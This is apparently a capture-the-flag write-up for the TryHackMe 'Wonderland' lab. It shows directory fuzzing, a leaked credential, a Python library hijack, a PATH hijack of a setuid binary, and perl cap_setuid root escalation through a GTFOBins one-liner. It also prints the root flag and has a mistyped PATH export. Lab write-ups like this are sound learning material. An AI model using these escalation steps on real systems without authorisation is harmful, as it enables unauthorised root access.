# Wonderland
A website was given with Alice in Wonderland story<br/>
Fuzzing through directories, we found `http://<IP>/r/a/b/b/i/t`. Viewing the source code, we found a hidden line:
```
alice:HowDothTheLittleCrocodileImproveHisShiningTail
```
Running nmap on the container shows open port 22.<br/>
Using `pwncat`, logging in as `alice` with password `alice:HowDothTheLittleCrocodileImproveHisShiningTail` and we have 2 files in alice home directory: root.txt and walrus_and_the_carpenter.py. Running `sudo -l` showed we can run python with the file `walrus_and_the_carpenter.py` as user `rabbit`.

On top of `walrus_and_the_carpenter.py` file, it imports random library, we can create the python script named `random.py` in the same directory so it will get called inside `walrus_and_the_carpenter.py`.
```py
import os

os.system('/bin/bash')
```
This script will spawn us a bash for `rabbit`

As `rabbit`, navigate to `/home/rabbit`, we will find a file `teaParty`, throw this file in ghidra we will find it first call `setuid() setgid()` then a `system()` command.
```c
void main(void)
{
  setuid(0x3eb);
  setgid(0x3eb);
  puts("Welcome to the tea party!\nThe Mad Hatter will be here soon.");
  system("/bin/echo -n \'Probably by \' && date --date=\'next hour\' -R");
  puts("Ask very nicely, and I will give you some tea while you wait for him");
  getchar();
  puts("Segmentation fault (core dumped)");
  return;
}
```
Inside the system command, `date` is called without an absolute path, we can create a script named `date` and add our path to $PATH.
```sh
export $PATH=/home/habbit:$PATH
```
date script:
```sh
#!/bin/bash
/bin/bash
```
Running `./teaParty` spawns a shell for user `hatter`.

Because I'm using pwncat, `run enumerate.gather` shows:
```
file.caps
  - /usr/bin/perl5.26.1 -> [[cap_setuid+ep]]
  - /usr/bin/mtr-packet -> [[cap_net_raw+ep]]
  - /usr/bin/perl -> [[cap_setuid+ep]]
```
perl has access to setuid, which we can use to elevate to root. From GTFOBins we have a command:
```sh
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```
And now we are root!
```sh
cat /home/alice/root.txt
# thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
```
As for user.txt, I had to read other's write-ups to realize it's in /root/. Though we cannot read the folder /root, we can still `cat /root/user.txt`